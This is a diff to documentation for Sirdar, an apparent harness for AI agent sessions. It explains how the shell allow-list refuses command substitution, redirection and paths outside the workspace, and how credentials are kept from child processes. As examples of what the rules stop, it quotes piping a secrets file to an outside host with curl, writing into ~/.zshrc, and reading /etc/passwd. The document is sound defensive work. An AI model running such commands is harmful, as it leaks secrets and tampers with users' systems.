@@ -134,6 +134,26 @@ everything else, including every non-`Bash` write tool, is denied.
 That means `rg -n foo | head -50` needs both `rg *` and `head *` in the list, and a `cat *`
 pattern no longer approves `cat secrets | curl -T- example.com`.
 
+Two kinds of command are refused before the patterns are even consulted, because the pattern
+would be approving something it cannot see:
+
+- **Command and process substitution.** `$(...)`, a backquote, and `<(...)` all produce text
+  or a command at run time, so what would actually run cannot be read off the string the
+  policy is judging. Inside single or double quotes they are ordinary characters and pass.
+- **Redirection.** `>`, `>>`, `<`, `2>` and `&>` name a file the allow-list never approved:
+  `git log` is a read, `git log > ~/.zshrc` is not, and one pattern would cover both. The
+  refusal names the operator it found. Quoted, as in `rg "a>b"`, it is a search pattern and
+  passes.
+
+A command also has to stay inside the workspace. Every argument that looks like a path is
+resolved against the workspace root, and one that lands outside it is refused: `cat go.mod`
+runs, `cat ../../../etc/passwd` and `cat /etc/passwd` do not, and neither does anything
+starting with `~`. Read that as a guard rail rather than a boundary — it reads the command as
+text, so it does not follow symlinks, does not know which of a program's arguments are paths,
+and cannot see a path the program builds for itself at run time. **It is a heuristic, not a
+sandbox.** A run that must be confined for real needs a container around it; this is the part
+that catches the obvious ways out.
+
 - `*` matches any run of characters, including spaces and `/`. `git log*` matches
   `git log --oneline -20` and `git log -- some/path`.
   The pattern is a full-string match, not a prefix, so `git log*` also matches
@@ -155,6 +175,10 @@ starts the Claude session with `--strict-mcp-config --mcp-config <workspace>/.mc
 the session loads those servers and no others. With no such file it passes neither flag, the
 session inherits every MCP server the operator has configured for themselves, and
 `sirdar doctor` prints a warning saying so.
+
+`provider: openai` is not affected by the setting, because it never had the wider reach to
+give up: the loop starts MCP servers itself, and the workspace's `.mcp.json` is the only file
+it reads.
 
 `permissions.mcp` is a list of globs matched against an MCP tool's full name, e.g.
 `mcp__grafana__query_*`. While the list is empty, an `mcp__*` tool is allowed unless its own
@@ -256,8 +280,18 @@ tool results are replaced with `[trimmed]`, keeping the six most recent, so a lo
 degrades instead of failing at the endpoint's limit.
 
 `openai.apiKey` is resolved once, at startup, and held in memory: it is never written to a run
-directory, never printed by `sirdar doctor`, and — like every other `env:` credential in config
-— stripped from the environment the session's shell commands and MCP servers inherit.
+directory and never printed by `sirdar doctor`. What the session's own processes get is not
+Sirdar's environment with the credentials taken out, but a small one built from nothing:
+`PATH`, `HOME` and `LANG`, each only when Sirdar itself has it. An allow-listed shell command
+gets exactly those three. An MCP server gets those three plus whatever its own `env` block in
+`.mcp.json` asks for.
+
+That last part is the gap worth knowing. Values in `.mcp.json` expand `${VAR}` and `$VAR` from
+Sirdar's process environment, so a server entry containing
+`"env": {"KEY": "${OPENROUTER_API_KEY}"}` hands that key to that server, and nothing elsewhere
+in the run undoes it. `.mcp.json` is the workspace's own file, and reading it is the control;
+no other path in a run passes a credential to a child process.
+
 `billing:` does not apply: it exists to tell the Claude adapter whether to keep
 `ANTHROPIC_API_KEY` in place, and this provider is always billed against the key you configure.
 
